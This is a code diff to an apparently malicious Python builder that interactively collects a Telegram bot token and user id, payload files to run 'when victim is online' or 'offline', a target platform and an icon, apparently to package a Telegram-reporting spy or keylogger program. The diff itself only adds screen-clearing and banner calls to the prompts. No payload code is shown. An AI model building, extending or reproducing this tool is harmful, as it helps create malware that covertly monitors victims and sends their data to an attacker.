@@ -118,14 +118,26 @@ def get_options(): # get all of inputs and make python file
         id = str(input(Fore.GREEN + "[+]" + Fore.WHITE + " write your telegram user id(with @userinfobot): "))
         token = str(input(Fore.GREEN + "[+]" + Fore.WHITE + " write your telegram bot token here: ")).lower()
         name = str(input(Fore.GREEN + "[+]" + Fore.WHITE + " write your application name: ")).lower()      
+        clear()
+        same_banner()
         max_letter = str(input(Fore.GREEN + "[+]" + Fore.WHITE + " write your max letter value(after that bot send you a link on note. its faster! | just write number without space): "))  
+        clear()
+        same_banner()
         try:
             int(max_letter)
         except: print(Fore.RED + "Invalid input(Just write number without space)."), exit()
         code_addr_inp = str(input(Fore.GREEN + "[+]" + Fore.WHITE + " write your code file address for when victim is online(befor that check the imported libraries in bulder/windows-build or bulder/linux-build | and you can use standard Tkinter payloads. check them out from builder/tk_payloads): ")).lower()    
+        clear()
+        same_banner()
         offline_code_addr_inp = str(input(Fore.GREEN + "[+]" + Fore.WHITE + " write your code file address for when victim is offline(befor that check the imported libraries in bulder/windows-build or bulder/linux-build | and you can use standard Tkinter payloads. check them out from builder/tk_payloads/offline): ")).lower()    
+        clear()
+        same_banner()
         platform_inp = str(input(Fore.GREEN + "[+]" + Fore.WHITE + " choice your platform(windows, linux, mac): ")).lower()
+        clear()
+        same_banner()
         icon_inp = str(input(Fore.GREEN + "[+]" + Fore.WHITE + " write your icon file address(.ico): "))
+        clear()
+        same_banner()
         # validate the inputs
         if platform_inp.startswith("win"):
             platform = "builder/windows-build.py"
